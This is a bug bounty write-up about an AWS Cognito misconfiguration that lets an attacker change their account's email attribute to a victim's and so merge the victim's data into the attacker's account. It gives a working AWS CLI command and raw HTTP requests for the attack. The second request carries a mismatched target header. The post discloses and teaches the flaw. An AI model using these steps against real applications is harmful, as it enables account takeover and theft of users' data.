---
layout: post
title:  "AWS Cognito Misconfiguration"
date:   2022-11-04
categories: bugbounty
---

Hello everyone, hope you are all good and having some fun. After a long time I came up with an other interesting blog where I discuss about an interesting AWS Cognito misconfiguration allowing attacker to merge victim's account with the attacker account on behalf of the victim. This was found on one of the engagements at Synack Red Team.

For those who doesn't know about AWS Cognito. 

### Amazon Cognito

Amazon Cognito provides authentication, authorization, and user management for customer's web and mobile applications. Users can sign in directly with a user name and password, or through a third party such as Facebook, Amazon, Google, Apple, or enterprise identity providers via SAML 2.0 and OpenID Connect. The two main components of Amazon Cognito are user pools and identity pools. User pools are user directories that provide sign-up and sign-in options for application users. Identity pools enable developers to grant users access to other AWS services

**References:**
* [https://aws.amazon.com/cognito/](https://aws.amazon.com/cognito/)
* [https://www.techtarget.com/searchaws/definition/Amazon-Cognito](https://www.techtarget.com/searchaws/definition/Amazon-Cognito)

<p align="center">
<img src="https://docs.aws.amazon.com/images/cognito/latest/developerguide/images/cognito-user-pool-auth-flow-srp.png">
</p>

The Target application was using AWS Cognito for authentication purpose. Upon Login to the application certain requests were being made to AWS Cognito to validate the user. Once the validation check was passed you will be allowed to login to the application

The flow will be as follows

User login -> AWS Cognito (Authentication) -> AWS Cognito (Get User Attributes) -> Application Login

The request for `Get User Attribute` will have a header named `X-Amz-Target: AWSCognitoIdentityProviderService.GetUser` and the response for the request will be as follows

**Request:**
```
POST / HTTP/2
Host: cognito-idp.us-west-2.amazonaws.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.GetUser
X-Amz-User-Agent: aws-amplify/5.0.4 js
Content-Length: 1072
Origin: https://<REDACTED>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site

{"AccessToken":"<Token>"}
```

**Response:**
```
{
    "Username": "attacker@attacker.com",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "<UUID>"
        },
        {
            "Name": "email_verified",
            "Value": "false"
        },
        {
            "Name": "email",
            "Value": "attacker@attacker.com"
        }
    ]
}
``` 

The above response gives us the list of `user attributes` available. Among those three attributes the `email` attribute is interesting. If we can able to change our email address to victim's email address then we were able to login to the victim account with our attacker's password right? So with this mindset I started the exploitation process by making a request to `Update UserAttributes`. The Update User attribute request can be done by using `AWS CLI` or using a `HTTP Request`. Both examples have been given below

### Method 1 (Using AWS CLI)

**AWS CLI**
```
aws cognito-idp update-user-attributes --region us-west-2 --access-token <Token> --user-attributes 'Name=email,Value=**victim@victim.com**'
```

Run the above command to update the email address to victim's email address. After running the command the update operation was successfull. If you get an error like this `An error occured (AliasExistsException) when calling the UpdateUserAttributes operation: An account with the given email address already exists` it means the application was not vulnerable. 
 
Upon making a request to retrieve the updated `user attributes` using aws-cli with the below given command the response was as follows.

**AWS CLI**
```
aws cognito-idp get-user --region us-west-2 --access-token <Token>
```

**Response:**
```
{
    "Username": "attacker@attacker.com",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "<UUID>"
        },
        {
            "Name": "email_verified",
            "Value": "false"
        },
        {
            "Name": "email",
            "Value": "victim@victim.com"
        }
    ]
}
``` 

### Method 2 (Using RAW HTTP Request)

**Request:**
```
POST / HTTP/2
Host: cognito-idp.us-west-2.amazonaws.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.GetUser
X-Amz-User-Agent: aws-amplify/5.0.4 js
Content-Length: 1072
Origin: https://<REDACTED>
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site

{
   "AccessToken": "string",  
   "UserAttributes": [
        {   
            "Name": "sub",
            "Value": "<UUID>"
        },
        {   
            "Name": "email_verified",
            "Value": "false"
        },
        {   
            "Name": "email",
            "Value": "victim@victim.com"
        }
    ]
}
```

**Response:**
```
{   
    "Username": "attacker@attacker.com",
    "UserAttributes": [
        {   
            "Name": "sub",
            "Value": "<UUID>"
        },
        {   
            "Name": "email_verified",
            "Value": "false"
        },
        {   
            "Name": "email",
            "Value": "victim@victim.com"
        }
    ]
}
```

Now as per the mindset discussed above I have tried to login to the application with the below given credentials.

```
Email: victim@victim.com
Password: attacker'spassword
```

The login was failed. From the above given response i noticed the `username` still remains the same as `attacker@attacker.com` only the email attribute has been changed. So I tried to login to the application with the attacker's credentials such as

```
Email: attacker@attacker.com
Password: attacker'spassword
```

Login was successfull and all the data belonging to `victim@victim.com` was successfully merged over to `attacker's account`. Changes being done by `attacker` was being reflected to `victim's` account. Victim can still login to the application using his credentials as well.


